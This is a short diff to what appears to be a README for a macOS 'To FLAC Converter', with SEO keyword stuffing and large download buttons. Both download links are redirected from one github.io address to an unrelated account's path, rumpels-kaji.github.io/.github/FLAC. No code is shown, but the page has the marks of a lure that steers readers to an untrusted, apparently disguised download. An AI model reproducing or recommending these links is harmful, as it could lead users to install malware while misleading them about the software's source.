@@ -4,7 +4,7 @@
 
 <!-- Download Button #1 — badge/shield style -->
 <div align="center" style="margin:14px 0 18px;">
-  <a href="http://to-flac-converter.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/FLAC">
     <img src="https://img.shields.io/badge/⬇️_GET_TO_FLAC_CONVERTER-deeppink?style=for-the-badge&logo=apple&logoColor=white" alt="Download To FLAC Converter for macOS">
   </a>
 </div>
@@ -93,7 +93,7 @@ to flac converter mac • batch flac mac • lossless audio converter • mp3 to
 
 <!-- Download Button #2 — pill/gradient style -->
 <div align="center" style="margin:18px 0 22px;">
-  <a href="http://to-flac-converter.github.io/.github" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#10b981,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(16,185,129,.25);">
+  <a href="https://rumpels-kaji.github.io/.github/FLAC" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#10b981,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(16,185,129,.25);">
     🎵 Download To FLAC Converter for macOS
   </a>
 </div>
